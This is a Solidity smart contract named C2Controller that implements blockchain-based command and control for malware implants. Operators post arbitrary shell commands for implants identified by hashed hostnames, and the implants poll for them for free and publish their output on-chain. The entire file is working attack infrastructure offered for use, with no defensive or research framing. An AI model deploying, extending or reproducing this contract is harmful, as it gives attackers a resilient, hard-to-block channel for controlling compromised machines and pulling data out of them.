// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title C2Controller
 * @notice Blockchain-based Command & Control — commands in, results out.
 *         Operators issue commands. Implants poll for commands and submit results.
 *         Command reads are public + free (no gas). Results are public by design.
 */
contract C2Controller is Ownable {

    // ──────────────────────────────────────────────
    //  Types
    // ──────────────────────────────────────────────

    /// @notice A single command targeted at an implant.
    struct Command {
        string data;        // the raw command string
        bool    active;     // true until ack/deletion
    }

    /// @notice A result submitted by an implant.
    struct Result {
        string data;
        uint256 timestamp;
        bytes32 commandId;  // link back to the original command
    }

    // ──────────────────────────────────────────────
    //  State
    // ──────────────────────────────────────────────

    /// @notice implantID => commandId => Command
    mapping(bytes32 => mapping(bytes32 => Command)) public commands;

    /// @notice implantID => list of active command IDs
    mapping(bytes32 => bytes32[]) private _activeCommands;

    /// @notice Unique result ID (incrementing) => Result
    mapping(bytes32 => Result) public results;

    /// @notice Authorised operator addresses (in addition to owner).
    mapping(address => bool) public operators;

    /// @notice Total result count (for enumeration).
    bytes32[] private _resultIds;

    // ──────────────────────────────────────────────
    //  Events
    // ──────────────────────────────────────────────

    /// @notice Emitted when an operator issues a command.
    event CommandIssued(
        bytes32 indexed implantId,
        bytes32 indexed commandId,
        string  command,
        uint256 timestamp
    );

    /// @notice Emitted when an implant submits a result.
    event ResultSubmitted(
        bytes32 indexed implantId,
        bytes32 indexed commandId,
        bytes32 indexed resultId,
        string  result,
        uint256 timestamp
    );

    /// @notice Emitted when an operator is added or removed.
    event OperatorUpdated(address indexed operator, bool active);

    // ──────────────────────────────────────────────
    //  Modifiers
    // ──────────────────────────────────────────────

    modifier onlyOperator() {
        require(owner() == _msgSender() || operators[_msgSender()],
            "C2Controller: caller is not an operator");
        _;
    }

    // ──────────────────────────────────────────────
    //  Constructor
    // ──────────────────────────────────────────────

    /// @param initialOperator An additional operator address (can be address(0)).
    constructor(address initialOperator) Ownable(_msgSender()) {
        if (initialOperator != address(0)) {
            operators[initialOperator] = true;
            emit OperatorUpdated(initialOperator, true);
        }
    }

    // ──────────────────────────────────────────────
    //  Operator Management
    // ──────────────────────────────────────────────

    /// @notice Add or remove an operator (owner only).
    function setOperator(address op, bool active) external onlyOwner {
        operators[op] = active;
        emit OperatorUpdated(op, active);
    }

    // ──────────────────────────────────────────────
    //  Command Lifecycle
    // ──────────────────────────────────────────────

    /// @notice Issue a command to a specific implant.
    /// @param implantId Unique implant identifier (e.g. keccak256(hostname)).
    /// @param command   Raw command string (can be any shell command).
    function issueCommand(bytes32 implantId, string calldata command)
        external
        onlyOperator
    {
        bytes32 cmdId = keccak256(abi.encodePacked(implantId, command, block.timestamp));

        commands[implantId][cmdId] = Command({
            data:   command,
            active: true
        });
        _activeCommands[implantId].push(cmdId);

        emit CommandIssued(implantId, cmdId, command, block.timestamp);
    }

    /// @notice Read a pending command (public / view — free, no gas).
    /// @return The command string, or empty string if not found or inactive.
    function getCommand(bytes32 implantId, bytes32 commandId)
        external
        view
        returns (string memory)
    {
        Command storage c = commands[implantId][commandId];
        if (!c.active) return "";
        return c.data;
    }

    /// @notice Get all active command IDs for an implant.
    function getActiveCommands(bytes32 implantId)
        external
        view
        returns (bytes32[] memory)
    {
        return _activeCommands[implantId];
    }

    /// @notice Get the latest active command for an implant (convenience).
    /// @return The command string, or empty if none pending.
    function getLatestCommand(bytes32 implantId)
        external
        view
        returns (string memory)
    {
        bytes32[] storage ids = _activeCommands[implantId];
        if (ids.length == 0) return "";
        bytes32 latestId = ids[ids.length - 1];
        Command storage c = commands[implantId][latestId];
        if (!c.active) return "";
        return c.data;
    }

    /// @notice Acknowledge (deactivate) a command without submitting a result.
    function ackCommand(bytes32 implantId, bytes32 commandId) external {
        commands[implantId][commandId].active = false;
    }

    // ──────────────────────────────────────────────
    //  Result Submission
    // ──────────────────────────────────────────────

    /// @notice Submit a command result (anyone can call; implants submit their own).
    /// @param implantId The implant identifier.
    /// @param commandId The command identifier this result is for.
    /// @param result    The output / error string.
    function submitResult(
        bytes32 implantId,
        bytes32 commandId,
        string calldata result
    ) external {
        // Deactivate the command on first result submission.
        commands[implantId][commandId].active = false;

        bytes32 resultId = keccak256(
            abi.encodePacked(implantId, commandId, result, block.timestamp)
        );

        results[resultId] = Result({
            data:      result,
            timestamp: block.timestamp,
            commandId: commandId
        });
        _resultIds.push(resultId);

        emit ResultSubmitted(implantId, commandId, resultId, result, block.timestamp);
    }

    /// @notice Read a submitted result (public view — free).
    function getResult(bytes32 resultId)
        external
        view
        returns (string memory data, uint256 timestamp, bytes32 commandId)
    {
        Result storage r = results[resultId];
        return (r.data, r.timestamp, r.commandId);
    }

    /// @notice Get result count (for enumeration / off-chain pagination).
    function resultCount() external view returns (uint256) {
        return _resultIds.length;
    }

    /// @notice Get result ID by index.
    function resultIdAtIndex(uint256 idx) external view returns (bytes32) {
        return _resultIds[idx];
    }
}
